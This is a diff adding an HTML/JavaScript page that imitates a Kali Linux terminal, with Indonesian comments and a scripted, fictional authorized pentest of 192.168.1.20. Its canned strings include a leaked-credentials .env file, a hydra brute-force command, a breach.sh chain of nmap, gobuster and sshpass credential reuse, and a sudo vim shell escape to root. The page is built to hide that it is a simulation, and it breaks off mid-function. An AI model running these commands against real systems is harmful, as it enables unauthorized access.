@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<!--
+═══════════════════════════════════════════════════════════════════════════
+ ANALISIS FILE SEBELUMNYA (index.html versi lama)
+───────────────────────────────────────────────────────────────────────────
+ [F1] Halaman memakai tombol "START HACKING" + label "simulasi ethical
+      hacking" + "DOWNLOAD KONTEN"  → immersion rusak, jelas terlihat palsu.
+ [F2] Tidak ada terminal sungguhan: tidak ada stdin, tidak ada prompt,
+      tidak ada penanganan keyboard, tidak ada history/Ctrl+C/Tab.
+ [F3] Tidak mengikuti standar visual Kali Linux (login tty, zsh prompt
+      ┌──(user㉿host)-[~], warna output, MOTD, boot sequence).
+ [F4] Tidak ada command handling / error handling (command not found,
+      permission denied, exit status, prompt merah saat error).
+ [F5] Tidak ada skenario kerja yang koheren (recon → foothold → privesc),
+      sehingga terlihat seperti animasi acak, bukan sesi kerja nyata.
+ [F6] Font fallback monospace seadanya, tidak responsive, fokus keyboard
+      tidak dikelola.
+
+ PERBAIKAN YANG DITERAPKAN
+───────────────────────────────────────────────────────────────────────────
+ [P1] Semua penanda "simulasi/tombol" dihapus total.
+ [P2] Rebuild penuh: boot systemd → login tty1 (user: kali) → MOTD →
+      shell zsh interaktif dengan prompt Kali asli.
+ [P3] ±60 command nyata: coreutils, network, dan tool Kali (nmap, hydra,
+      sqlmap, gobuster, nikto, john, hashcat, msfconsole, msfvenom,
+      searchsploit, wifite, neofetch, vim, python3, ssh, sudo, ...).
+ [P4] Error handling realistis: "zsh: command not found", "Permission
+      denied", prompt └─$ merah saat exit status gagal, Ctrl+C, Ctrl+L,
+      Tab completion, history (↑/↓).
+ [P5] Senario pentest resmi (SOW fiktif) di 192.168.1.20: recon →
+      kredensial bocor → SSH foothold → privesc sudo vim → root.
+      Sub-shell msfconsole & ssh remote juga berfungsi.
+ [P6] JetBrains Mono via fontsource, capture input tersembunyi (desktop
+      + mobile), auto-scroll, snapshot layar untuk vim/man (alt-screen).
+
+ VERIFIKASI (review statis alur)
+───────────────────────────────────────────────────────────────────────────
+ [V1] boot → login (hanya "kali" diterima, selain itu "Login incorrect").
+ [V2] Shell: help/ls/cat/cd/sudo/exit dll menghasilkan output sesuai alur.
+ [V3] ssh admin@192.168.1.20 hanya sukses dengan password dari .env/hydra.
+ [V4] Ctrl+C menginterupsi proses panjang (nmap/hydra/breach.sh).
+ [V5] Tidak ada referensi resource eksternal selain fontsource CDN.
+═══════════════════════════════════════════════════════════════════════════
+-->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>kali@kali: ~</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.0.18/400.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.0.18/700.css">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{background:#000;min-height:100%}
+  body{
+    font-family:'JetBrains Mono','Noto Sans Symbols 2','Segoe UI Symbol',monospace;
+    font-size:15px;line-height:1.42;color:#d6d6d6;
+    padding:12px 16px 40px;caret-color:transparent;
+    -webkit-font-smoothing:antialiased;overflow-x:hidden;
+  }
+  #term{white-space:pre-wrap;word-break:break-word}
+  .line{min-height:1.42em}
+  .bl{color:#5c9dff}.cy{color:#37d2ff}.gr{color:#4af626}.rd{color:#ff4d4d}
+  .yl{color:#ffd75f}.mg{color:#d0a5ff}.gy{color:#8a938a}.wh{color:#e8e8e8}
+  .bd{font-weight:700}.dim{opacity:.75}
+  .cur{display:inline-block;width:.62em;height:1.12em;background:#d6d6d6;
+       vertical-align:-0.18em;margin-left:1px;animation:blink 1.06s steps(1) infinite}
+  @keyframes blink{50%{opacity:0}}
+  #cap{position:fixed;left:0;bottom:0;width:2px;height:2px;opacity:.01;
+       border:0;background:transparent;resize:none;outline:none;z-index:-1}
+  ::selection{background:#264f78;color:#fff}
+  @media (max-width:640px){body{font-size:12.5px;padding:8px 10px 34px}}
+</style>
+</head>
+<body>
+<div id="term"></div>
+<textarea id="cap" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false" aria-hidden="true"></textarea>
+
+<script>
+'use strict';
+/* ══════════════ util & state ══════════════ */
+const TERM=document.getElementById('term');
+const CAP=document.getElementById('cap');
+const BAR=document.createElement('div');BAR.className='line';TERM.appendChild(BAR);
+const wait=ms=>new Promise(r=>setTimeout(r,ms));
+const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+const R=(a,b)=>Math.floor(a+Math.random()*(b-a));
+
+const S={
+  mode:'boot', fast:false, aborted:false, root:false, sudoCache:false,
+  host:'kali', cwd:'~', lastErr:false,
+  hist:[], histIdx:0,
+  remote:null,            // {user,host,root,cwd}
+  msf:null,               // {module,prompt}
+  vimBackup:null, vimFile:'', vimCmd:'', vimColon:false,
+  snap:null, pagerBack:'shell',
+  pyPrompt:'>>> ',
+  extraFiles:[], extraDirs:[], nextMode:null
+};
+let buf='', CAPT=null, inlineHist=[];
+
+const PASS='Winter#2026!';
+const TARGET='192.168.1.20';
+
+/* seed history — jejak operator sesi sebelumnya */
+const SEED=[
+ 'ip a','cat /etc/os-release','cat ops/target.txt',
+ 'nmap -sS -sV -O '+TARGET,
+ 'gobuster dir -u http://'+TARGET+' -w /usr/share/wordlists/dirb/common.txt',
+ 'curl -s http://'+TARGET+'/backup/.env | tee ops/loot.env',
+ 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://'+TARGET+' -t 4',
+ 'ssh admin@'+TARGET,'sudo -l','history'
+];
+
+/* ══════════════ output helpers ══════════════ */
+function ensureBar(){if(BAR.parentNode!==TERM)TERM.appendChild(BAR);}
+function sc(){window.scrollTo(0,document.body.scrollHeight);}
+function P(html,cls){const d=document.createElement('div');d.className='line'+(cls?' '+cls:'');d.innerHTML=html;TERM.insertBefore(d,BAR);sc();}
+function T(t,cls){P(esc(t),cls);}
+function BL(){P('&nbsp;');}
+async function emit(items,base){
+  for(const it of items){
+    if(S.aborted){P('<span class="rd">^C</span>');break;}
+    let h,cls,d;
+    if(typeof it==='string'){h=esc(it);}
+    else if(Array.isArray(it)){h=esc(it[0]);cls=it[1];d=it[2];}
+    else {h=it.h;cls=it.cls;d=it.d;}
+    P(h,cls);
+    await wait(S.fast?0:(d??base??14));
+  }
+}
+
+/* ══════════════ prompt ══════════════ */
+function kaliPrompt(){
+  const u=S.root?'root':'kali', sep=S.root?'#':'$';
+  const errCls=S.lastErr?'rd':'bl';
+  return '<span class="bl">┌──(</span><span class="cy bd">'+u+'</span>'+
+         '<span class="rd">㉿</span><span class="cy bd">'+esc(S.host)+'</span>'+
+         '<span class="bl">)-[</span><span class="mg">'+esc(S.cwd)+'</span><span class="bl">]</span>'+
+         '<br><span class="bl">└─</span><span class="'+errCls+'">'+sep+'</span> ';
+}
+function promptHTML(){
+  if(S.mode==='remote'||S.mode==='remoteroot'){
+    const rm=S.remote, u=rm.root?'root':rm.user, sep=rm.root?'#':'$';
+    return '<span class="gr bd">'+u+'@'+esc(rm.host)+'</span><span class="wh">:</span>'+
+           '<span class="bl bd">'+esc(rm.cwd)+'</span><span class="wh">'+sep+' </span>';
+  }
+  if(S.mode==='msf'){
+    const m=S.msf&&S.msf.module?' '+S.msf.module.replace('auxiliary/','auxiliary/'):'';
+    return '<span class="rd bd">msf6'+(S.msf&&S.msf.module?' '+esc(S.msf.module):'')+'</span> <span class="bl">&gt;</span> ';
+  }
+  if(S.mode==='py'){return '<span class="wh">&gt;&gt;&gt; </span>';}
+  return kaliPrompt();
+}
+function hideBar(){BAR.style.display='none';}
+function showBar(){ensureBar();BAR.style.display='block';renderBar();}
+function renderBar(){
+  ensureBar();
+  if(CAPT){
+    BAR.innerHTML='<span class="wh">'+esc(CAPT.prompt)+'</span>'+
+      (CAPT.masked?'':'<span>'+esc(CAPT.buf)+'</span>')+'<span class="cur"></span>';
+  }else{
+    BAR.innerHTML=promptHTML()+'<span>'+esc(buf)+'</span><span class="cur"></span>';
+  }
+  sc();
+}
+function freezeTyped(line,extra){
+  P(promptHTML()+esc(line)+(extra?'<span class="rd">'+extra+'</span>':''));
+}
+
+/* ══════════════ busy wrapper & readLine ══════════════ */
+async function busy(ret,fn){
+  const prev=S.mode;S.mode='busy';hideBar();S.aborted=false;
+  try{await fn();}finally{
+    S.mode=S.nextMode||ret;S.nextMode=null;S.aborted=false;
+    if(S.mode!=='off'&&S.mode!=='vim'&&S.mode!=='pager')showBar();
+  }
+}
+function readLine(prompt,masked){
+  return new Promise(res=>{
+    CAPT={prompt,masked:!!masked,buf:'',res};renderBar();CAP.focus();
+  });
+}
+function finishCapt(v){
+  const p=CAPT.prompt,m=CAPT.masked,r=CAPT.res;CAPT=null;
+  P('<span class="wh">'+esc(p)+'</span>'+(m?'':esc(v)));
+  r(v);
+}
+
+/* ══════════════ file system fiktif ══════════════ */
+const TARGET_TXT=
+`================================================
+ ENGAGEMENT   : RED TEAM / PEN-TEST - Acme Corp
+ TARGET       : 192.168.1.20 (WEB-PROD-01)
+ SCOPE        : web app, ssh, internal services
+ AUTHORIZATION: SOW-2026-0814 (signed 2026-08-14)
+================================================
+[ ] recon       -> nmap full service scan
+[ ] enum web    -> gobuster + robots.txt
+[ ] creds       -> cek direktori /backup (bocor saat recon awal)
+[ ] akses awal  -> ssh / kredensial service
+[ ] privesc     -> sudo -l, GTFOBins
+[ ] bukti       -> /home/admin/user.txt dan /root/root.txt
+
+CATATAN: jangan sentuh subnet lain. semua aktivitas di-log.`;
+
+const LOOT_ENV=
+`APP_NAME="Acme Intranet"
+APP_ENV=production
+APP_KEY=base64:8sJ2mQpZ1xLm9tR4vYw7bNcE5dHfK3aT0uIq9dWz
+APP_DEBUG=true
+DB_HOST=127.0.0.1
+DB_DATABASE=intranet
+DB_USERNAME=app_user
+DB_PASSWORD=Zk9!mQ2vLrTx7w
+# TODO (sysadmin): ganti password SSH akun 'admin' setelah audit Q3
+# sementara pakai: Winter#2026!`;
+
+const BREACH_SH=
+`#!/bin/bash
+# =============================================================
+#  breach.sh - automated initial access + privesc chain
+#  Target : 192.168.1.20 (WEB-PROD-01) — SOW-2026-0814 (AUTHORIZED)
+# =============================================================
+TARGET=192.168.1.20
+
+echo "[*] target : $TARGET"
+echo "[1/5] full service scan ..."
+nmap -sS -sV -T4 "$TARGET"
+
+echo "[2/5] web directory brute-force ..."
+gobuster dir -u "http://$TARGET" -w /usr/share/wordlists/dirb/common.txt -q
+
+echo "[3/5] checking exposed backup directory ..."
+curl -s "http://$TARGET/backup/.env" | tee ops/loot.env
+
+echo "[4/5] credential reuse -> ssh foothold ..."
+sshpass -p "$(grep -oP 'sementara pakai: \\K.*' ops/loot.env)" \\
+  ssh -o StrictHostKeyChecking=no admin@$TARGET 'id; cat ~/user.txt'
+
+echo "[5/5] privilege escalation via sudo vim (GTFOBins) ..."
+sshpass -p "$(grep -oP 'sementara pakai: \\K.*' ops/loot.env)" \\
+  ssh admin@$TARGET "sudo vim -c ':!/bin/sh' -c ':q' /etc/nginx/nginx.conf"`;
+
+const FILES={
+ 'ops/target.txt':TARGET_TXT, 'ops/loot.env':LOOT_ENV, 'ops/breach.sh':BREACH_SH,
+ '~/.zshrc':'# ~/.zshrc\nexport PATH=$HOME/bin:$PATH\nexport EDITOR=vim\nalias ll="ls -la"\nalias msf="msfconsole -q"\n# see ops/ for current engagement',
+ '/etc/hostname':'kali\n',
+ '/etc/os-release':'PRETTY_NAME="Kali GNU/Linux Rolling"\nNAME="Kali GNU/Linux"\nID=kali\nVERSION="2026.2"\nVERSION_ID="2026.2"\nVERSION_CODENAME="kali-rolling"\nID_LIKE=debian\nANSI_COLOR="1;34"\nHOME_URL="https://www.kali.org/"\nSUPPORT_URL="https://forums.kali.org/"',
+ '/etc/passwd':'root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh',
+ '/etc/shadow':'root:!:20482::::::\nkali:$y$j9T$qX8vB2zW1mN0pR5sK7cH.$Lk3dJ9fYt2vXw8mZpQ6nB4rT1sU5aG7eC0hD3iO9f:20482:0:99999:7:::',
+ '~/.ssh/known_hosts':'192.168.1.20 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBq7hQ3mJf0sKv2wXpR9tY4nLcE6dZa1UoG8iT5b'
+};
+function resolveFile(name){
+  let n=name.replace(/["']/g,'').trim();
+  if(n==='~'||n.startsWith('~/'))n=n;
+  else if(!n.startsWith('/')&&!n.startsWith('~'))n=(S.cwd==='~'?'~/':S.cwd.replace(/\/$/,'')+'/')+n;
+  if(S.cwd==='~'&&n==='ops/target.txt')n=n; // keep
+  return n;
+}
+const LS_LONG=[
+'drwxr-xr-x 14 kali kali 4096 Aug 25 03:01 <b class="bl bd">.</b>',
+'drwxr-xr-x  3 root root 4096 Jul 30 21:14 <b class="bl bd">..</b>',
+'-rw-r--r--  1 kali kali  220 Jul 30 21:14 .bash_logout',
+'-rw-r--r--  1 kali kali 3771 Jul 30 21:14 .bashrc',
+'-rw-r--r--  1 kali kali  807 Jul 30 21:14 .profile',
+'-rw-r--r--  1 kali kali 5765 Jul 30 21:14 .zshrc',
+'drwx------  2 kali kali 4096 Aug 20 14:02 <b class="bl bd">.ssh</b>',
+'drwxr-xr-x  2 kali kali 4096 Jul 30 21:19 <b class="bl bd">Desktop</b>',
+'drwxr-xr-x  2 kali kali 4096 Jul 30 21:19 <b class="bl bd">Documents</b>',
+'drwxr-xr-x  2 kali kali 4096 Aug 21 23:47 <b class="bl bd">Downloads</b>',
+'drwxr-xr-x  2 kali kali 4096 Jul 30 21:19 <b class="bl bd">Music</b>',
+'drwxr-xr-x  2 kali kali 4096 Jul 30 21:19 <b class="bl bd">Pictures</b>',
+'drwxr-xr-x  2 kali kali 4096 Jul 30 21:19 <b class="bl bd">Public</b>',
+'drwxr-xr-x  2 kali kali 4096 Jul 30 21:19 <b class="bl bd">Templates</b>',
+'drwxr-xr-x  2 kali kali 4096 Jul 30 21:19 <b class="bl bd">Videos</b>',
+'drwxr-xr-x  2 kali kali 4096 Aug 22 01:12 <b class="bl bd">ops</b>',
+'lrwxrwxrwx  1 kali kali   26 Jul 30 21:19 <b class="cy bd">wordlists</b> -> /usr/share/wordlists'
+];
+
+/* ══════════════ boot sequence ══════════════ */
+const ok=n=>({h:'<span class="gr">[<b class="bd">  OK  </b>]</span> '+n});
+const BOOTLINES=[
+ {h:'<span class="gy">[    0.000000] microcode: microcode updated early to revision 0xf8, date = 2025-11-02</span>',d:4},
+ {h:'<span class="gy">[    0.000000] Linux version 6.12.20-kali1-amd64 (devel@kali.org) (gcc-14 (Debian 14.2.0-19) 14.2.0, GNU ld 2.44) #1 SMP PREEMPT_DYNAMIC Kali 6.12.20-1kali1 (2026-03-30)</span>',d:4},
+ {h:'<span class="gy">[    0.000001] Command line: BOOT_IMAGE=/boot/vmlinuz-6.12.20-kali1-amd64 root=UUID=8f3a2c1d-9b4e-4f7a-9c2d-1e6b8a3f5d90 ro quiet splash</span>',d:3},
+ {h:'<span class="gy">[    0.318224] ACPI: Enabled 4 GPEs in block 00 to 1F</span>',d:2},
+ {h:'<span class="gy">[    0.842107] pci 0000:00:02.0: vgaarb: setting as boot VGA device</span>',d:2},
+ {h:'<span class="gy">[    1.104332] usb 1-1: new high-speed USB device number 2 using xhci_hcd</span>',d:3},
+ {h:'<span class="gy">[    1.498021] systemd[1]: Detected virtualization oracle.</span>',d:3},
+ {h:'<span class="gy">[    1.512477] systemd[1]: Detected architecture x86-64.</span>',d:2},
+ {h:'<span class="wh">Welcome to <b class="bd">Kali GNU/Linux Rolling</b>!</span>',d:30},
+ {h:'<span class="gy">[    1.628114] systemd[1]: Hostname set to &lt;kali&gt;.</span>',d:3},
+ ok('Created slice system-getty.slice.'),ok('Reached target Local Encrypted Volumes.'),
+ ok('Reached target Path Units.'),ok('Reached target Remote File Systems.'),
+ ok('Started Load Kernel Modules.'),ok('Mounted /boot/efi.'),
+ ok('Started Apply Kernel Variables.'),ok('Started Load/Save OS Random Seed.'),
+ ok('Started Network Time Synchronization.'),ok('Started Network Manager.'),
+ {h:'<span class="gr">[<b class="bd">  OK  </b>]</span> Listening on <b>Load/Save RF Kill Switch Status /dev/rfkill</b>.',d:6},
+ ok('Started D-Bus System Message Bus.'),ok('Started OpenBSD Secure Shell server.'),
+ ok('Started Light Display Manager.'),ok('Reached target Graphical Interface.'),
+ {h:'<span class="wh">Starting Update UTMP about System Runlevel Changes...</span>',d:8},
+ ok('Finished Update UTMP about System Runlevel Changes.')
+];
+
+async function boot(){
+  S.mode='boot';
+  await emit(BOOTLINES,7);
+  BL();BL();
+  await emit([['Kali GNU/Linux Rolling kali tty1','wh',60]]);BL();
+  await loginLoop();
+}
+async function loginLoop(){
+  for(;;){
+    const u=(await readLine('kali login: ','')).trim();
+    if(u==='kali'){
+      await readLine('Password: ',true);
+      await wait(S.fast?0:420);
+      await shellEnter();
+      return;
+    }
+    await readLine('Password: ',true);
+    await wait(S.fast?0:420);
+    T('Login incorrect','wh');BL();
+    T('Kali GNU/Linux Rolling kali tty1','wh');BL();
+  }
+}
+async function shellEnter(){
+  BL();
+  T('Linux kali 6.12.20-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.20-1kali1 (2026-03-30) x86_64');BL();
+  T('The programs included with the Debian GNU/Linux system are free software;');
+  T('the exact distribution terms for each program are described in the');
+  T('individual files in /usr/share/doc/*/copyright.');BL();
+  T('Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent');
+  T('permitted by applicable law.');
+  const d=new Date(Date.now()-R(2,7)*3600*1000);
+  T('Last login: '+d.toDateString().slice(0,10)+' '+d.toTimeString().slice(0,8)+' 2026 from 192.168.1.17','gy');
+  S.mode='shell';S.root=false;S.cwd='~';S.hist=SEED.slice();S.histIdx=S.hist.length;
+  showBar();
+}
+
+/* ══════════════ NMAP / skenario output ══════════════ */
+function nmapOutput(){return [
+ ['Starting Nmap 7.95SVN ( https://nmap.org ) at 2026-08-25 '+clock(),'wh',30],
+ ['Nmap scan report for web-prod-01.lan (192.168.1.20)','wh',16],
+ ['Host is up (0.00041s latency).','wh',12],
+ ['Not shown: 995 closed tcp ports (reset)','gy',12],
+ ['PORT     STATE SERVICE     VERSION','bd',14],
+ ['21/tcp   open  <b class="gr">ftp</b>         vsftpd 3.0.3','wh',14],
+ ['22/tcp   open  <b class="gr">ssh</b>         OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)','wh',14],
+ ['80/tcp   open  <b class="gr">http</b>        Apache httpd 2.4.58 ((Ubuntu) PHP/8.1.27)','wh',14],
+ ['|_http-title: Acme Corp | Intranet Portal','gy',8],
+ ['| http-robots.txt: 2 disallowed entries','gy',8],
+ ['|_/admin /backup','gy',8],
+ ['445/tcp  open  <b class="gr">netbios-ssn</b> Samba smbd 4.15.13-Ubuntu (workgroup: WORKGROUP)','wh',14],
+ ['3306/tcp open  <b class="gr">mysql</b>       MySQL 8.0.36-0ubuntu0.22.04.1','wh',14],
+ ['MAC Address: <b class="cy">08:00:27:4A:1F:9C</b> (Oracle VirtualBox virtual NIC)','gy',12],
+ ['Device type: general purpose','wh',8],
+ ['Running: Linux 5.X|6.X','wh',8],
+ ['OS details: Linux 5.15 - 6.8','wh',8],
+ ['Network Distance: 1 hop','wh',8],
+ ['Service Info: Host: WEB-PROD-01; OS: Linux; CPE: cpe:/o:linux:linux_kernel','gy',12],
+ ['','wh',6],
+ ['OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .','gy',10],
+ ['Nmap done: 1 IP address (1 host up) scanned in <b class="yl">13.37</b> seconds','wh',10]
+];}
+function gobusterOutput(){return [
+ ['===============================================================','cy',6],
+ ['Gobuster v3.6','wh',6],
+ ['by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)','gy',10],
+ ['===============================================================','cy',6],
+ ['[+] Url:                     http://192.168.1.20','wh',4],
+ ['[+] Method:                  GET','wh',4],
+ ['[+] Threads:                 10','wh',4],
+ ['[+] Wordlist:                /usr/share/wordlists/dirb/common.txt','wh',4],
+ ['[+] Negative Status codes:   404','wh',4],
+ ['[+] User Agent:              gobuster/3.6','wh',4],
+ ['===============================================================','cy',6],
+ ['Starting gobuster in directory scanning mode','wh',120],
+ ['[03:14:22] <b class="gr">200</b>     4211B  /index.php','wh',26],
+ ['[03:14:23] <b class="yl">301</b>        0B  /admin  -&gt;  http://192.168.1.20/admin/','wh',26],
+ ['[03:14:24] <b class="rd">403</b>      278B  /admin/config','wh',26],
+ ['[03:14:27] <b class="gr">200</b>     1143B  /backup','wh',26],
+ ['[03:14:29] <b class="rd">403</b>      278B  /server-status','wh',26],
+ ['===============================================================','cy',6],
+ ['Finished','wh',6],
+ ['===============================================================','cy',6]
+];}
+function msfBanner(){return [
+ {h:'<span class="rd">                                  II/II</span>',d:2},
+ {h:'<span class="rd">                                  II/II                         .,;:cc:,.</span>',d:2},
+ {h:'<span class="rd">                                .&#39; II/II                       .&#39;,,,,,,,,,;.</span>',d:2},
+ {h:'<span class="rd">                                II/IIII/II                    .&#39;,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                                II/IIIIII/II                  &#39;,,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                              ./II/IIIIIIII/II/.               .,,,,,,,,,,,,,,,.</span>',d:2},
+ {h:'<span class="rd">                             ./II/IIIIIIIIII/II/.              ,,,,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                             .,II/IIIIIIIIIIII/II,             ,,,,,,,,,,,,,,,,,,.</span>',d:2},
+ {h:'<span class="rd">                             ,II/III/IIIIIIIIIIIII,           .,,,,,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                            .,II/IIII/IIIIIIIIIIII,           ,,,,,,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                            ,III/IIIII/IIIIIIIIIII,          .,,,,,,,,,,,,,,,,,,,.</span>',d:2},
+ {h:'<span class="rd">                            IIIIIIIIIII/IIIIIIIIIII          ,,,,,,,,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                            IIIIIIIIIIIIIIIIIIIIIII          ,,,,,,,,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                            IIIIIIIIIIIIIIIIIIIIIII          &#39;,,,,,,,,,,,,,,,,,,,.</span>',d:2},
+ {h:'<span class="rd">                            ,IIIIIIIIIIIIIIIIIIIII,           &#39;,,,,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                             IIIIIIIIIIIIIIIIIIIII             &#39;,,,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                             &#39;IIIIIIIIIIIIIIIIIII&#39;              &#39;,,,,,,,,,,,,,</span>',d:2},
+ {h:'<span class="rd">                              &#39;IIIIIIIIIIIIIIII&#39;                  &#39;,,,,,,,,,,.</span>',d:2},
+ {h:'<span class="rd">                                &#39;IIIIIIIIIIII&#39;                      &#39;,,,,,,,.</span>',d:2},
+ {h:'<span class="rd">                                  &#39;IIIIIIII&#39;                          &#39;,,,,.</span>',d:2},
+ {h:'<span class="rd">                                    &#39;IIII&#39;                              &#39;&#39;</span>',d:10},
+ ['','wh',4],
+ {h:'       =[ <b class="wh bd">metasploit v6.4.38-dev</b>                          ]',d:8},
+ {h:'+ -- --=[ 2489 exploits - 1263 auxiliary - 432 post        ]',d:4},
+ {h:'+ -- --=[ 1456 payloads - 47 encoders - 11 nops            ]',d:4},
+ {h:'+ -- --=[ 9 evasion                                        ]',d:4},
+ ['','wh',4],
+ ['Metasploit Documentation: https://docs.metasploit.com/','gy',12]
+];}
+
+/* ══════════════ breach.sh (auto chain) ══════════════ */
+async function breach(){
+  const E=(t,c,d)=>emit([[t,c||'wh',d??20]]);
+  await E('[*] target : 192.168.1.20 (WEB-PROD-01)','cy',60);
+  await E('[*] authorization: SOW-2026-0814 — OK','gy',80);
+  await E('[1/5] running: nmap -sS -sV -T4 192.168.1.20','yl',120);
+  await emit(nmapOutput().slice(3,14),16);
+  await E('[2/5] running: gobuster dir -u http://192.168.1.20 -w common.txt','yl',120);
+  await emit(gobusterOutput().slice(11,17),20);
+  await E('[3/5] running: curl -s http://192.168.1.20/backup/.env','yl',120);
+  await emit(LOOT_ENV.split('\n').map((l,i)=>[l,l.startsWith('#')?'gy':'wh',10]),10);
+  await E('[+] credential harvested -> admin : Winter#2026!','gr',200);
+  await E('[4/5] running: sshpass -p ******** ssh admin@192.168.1.20 "id; cat ~/user.txt"','yl',260);
+  await E('uid=1001(admin) gid=1001(admin) groups=1001(admin),1002(webdev)','wh',120);
+  await E('<b class="gr">FLAG{f00th0ld_0bt41n3d_v1a_cr3d_r3us3}</b>','gr',260);
+  await E('[5/5] privesc: sudo -l  ->  (root) NOPASSWD: /usr/bin/vim /etc/nginx/nginx.conf','yl',200);
+  await E('      GTFOBins: sudo vim -c \':!/bin/sh\'','gy',260);
+  await E('# id','wh',160);
+  await E('uid=0(root) gid=0(root) groups=0(root)','gr',160);
+  await E('# cat /root/root.txt','wh',200);
+  await E('<b class="gr">FLAG{r00t_0n_w3b-pr0d-01__25-08-2026}</b>','gr',300);
+  await E('[✓] objectives reached — cleanup done, report draft: ops/report.md','gr',80);
+}
+
+/* ══════════════ commands (shell lokal) ══════════════ */
+function clock(){const d=new Date();return d.toTimeString().slice(0,8);}
+async function askSudo(){
+  if(S.sudoCache)return true;
+  const p=await readLine('[sudo] password for kali: ',true);
+  if(p===null){return false;}
+  S.sudoCache=true;return true;
+}
+const CMDS={};
+
+CMDS.help=async()=>{await emit([
+ ['Kali GNU/Linux Rolling — zsh 5.9 (interactive)','bd',10],
+ ['','wh',4],
+ ['Core      : ls ll cd cat pwd whoami id uname date history clear exit sudo su','wh',6],
+ ['Network   : ifconfig ip ping arp ss curl wget ssh nc nmap','wh',6],
+ ['Recon     : gobuster nikto searchsploit masscan','wh',6],
+ ['Exploit   : hydra sqlmap john hashcat msfconsole msfvenom','wh',6],
+ ['Wireless  : wifite aircrack-ng','wh',6],
+ ['Misc      : neofetch vim man python3 ps df free find grep chmod touch mkdir rm','wh',6],
+ ['','wh',4],
+ ['Skenario aktif: cat ops/target.txt   (engagement SOW-2026-0814)','gy',6],
+ ['Auto-chain    : ./ops/breach.sh','gy',6]
+],6);};
+
+CMDS.clear=async()=>{TERM.innerHTML='';ensureBar();};
+CMDS.pwd=async()=>{T(S.cwd==='~'?'/home/kali':S.cwd);};
+CMDS.whoami=async()=>{T(S.root?'root':'kali');};
+CMDS.id=async()=>{T(S.root?'uid=0(root) gid=0(root) groups=0(root)':'uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),125(scanner),136(kaboxer)');};
+CMDS.hostname=async()=>{T('kali');};
+CMDS.uname=async(a)=>{T(a.includes('-a')?'Linux kali 6.12.20-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.20-1kali1 (2026-03-30) x86_64 GNU/Linux':'Linux');};
+CMDS.date=async()=>{const d=new Date(),D=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'],M=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];T(D[d.getDay()]+' '+M[d.getMonth()]+' '+d.getDate()+' '+clock()+' WIB '+d.getFullYear());};
+CMDS.uptime=async()=>{T(' '+clock()+' up  3:4'+R(0,9)+',  1 user,  load average: 0.52, 0.58, 0.61');};
+CMDS.echo=async(a)=>{T(a.replace(/\$USER/g,S.root?'root':'kali').replace(/\$HOME/g,'/home/kali').replace(/\$\{?USER\}?/g,'kali'));};
+CMDS.history=async()=>{const h=inlineHist.length?S.hist:S.hist;S.hist.forEach((c,i)=>T(String(i+1).padStart(4)+'  '+c));};
+CMDS.env=async()=>{await emit(['SHELL=/usr/bin/zsh','SESSION_MANAGER=local/kali:@/tmp/.ICE-unix/812','COLORTERM=truecolor','XDG_SESSION_TYPE=tty','LOGNAME=kali','HOME=/home/kali','LANG=en_US.UTF-8','PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games','TERM=xterm-256color','USER=kali','EDITOR=vim'],4);};
+
+CMDS.ls=async(a)=>{
+  if(S.cwd!=='~'){T('');return;}
+  if(a.includes('-l')){
+    T('total 60');
+    for(const l of LS_LONG)P(l);
+    for(const f of S.extraFiles)P('-rw-r--r--  1 kali kali    0 Aug 25 '+clock().slice(0,5)+' '+esc(f));
+    for(const d0 of S.extraDirs)P('drwxr-xr-x  2 kali kali 4096 Aug 25 '+clock().slice(0,5)+' <b class="bl bd">'+esc(d0)+'</b>');
+  }else{
+    P('<b class="bl bd">Desktop</b>  <b class="bl bd">Documents</b>  <b class="bl bd">Downloads</b>  <b class="bl bd">Music</b>  <b class="bl bd">Pictures</b>  <b class="bl bd">Public</b>  <b class="bl bd">Templates</b>  <b class="bl bd">Videos</b>  <b class="bl bd">ops</b>  <b class="cy bd">wordlists</b>'+
+      S.extraDirs.map(d0=>'  <b class="bl bd">'+esc(d0)+'</b>').join('')+
